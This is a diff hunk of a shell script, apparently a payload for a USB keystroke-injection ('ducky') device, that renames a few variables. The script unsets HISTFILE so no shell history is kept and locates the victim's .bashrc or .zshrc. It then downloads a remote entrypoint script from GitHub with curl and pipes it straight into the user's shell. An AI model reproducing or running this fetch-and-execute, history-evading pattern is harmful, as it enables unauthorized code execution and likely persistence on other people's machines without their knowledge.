@@ -11,19 +11,19 @@
 
 unset HISTFILE
 
-export CURRENT_SHELL=''
-CURRENT_SHELL=$(readlink /proc/$$/exe)
+export CURRENTSHELL=''
+CURRENTSHELL=$(readlink /proc/$$/exe)
 
-$CURRENT_SHELL
+$CURRENTSHELL
 unset HISTFILE
 
-[[ "$CURRENT_SHELL" == *"zsh"* ]] && CURRENT_SHELL="zsh"
-[[ "$CURRENT_SHELL" == *"bash"* ]] && CURRENT_SHELL="bash"
+[[ "$CURRENTSHELL" == *"zsh"* ]] && CURRENTSHELL="zsh"
+[[ "$CURRENTSHELL" == *"bash"* ]] && CURRENTSHELL="bash"
 
-export CONFIG_FILE=''
-[ "$CURRENT_SHELL" = "zsh" ] && CONFIG_FILE="${ZDOTDIR:-$HOME}/.zshrc"
-[ "$CURRENT_SHELL" = "bash" ] && CONFIG_FILE="$HOME/.bashrc"
+export CONFIGFILE=''
+[ "$CURRENTSHELL" = "zsh" ] && CONFIGFILE="${ZDOTDIR:-$HOME}/.zshrc"
+[ "$CURRENTSHELL" = "bash" ] && CONFIGFILE="$HOME/.bashrc"
 
-curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/script/entrypoint.sh' | $CURRENT_SHELL
+curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/script/entrypoint.sh' | $CURRENTSHELL
 
 #!DUCKY!ATTACKMODE STORAGE
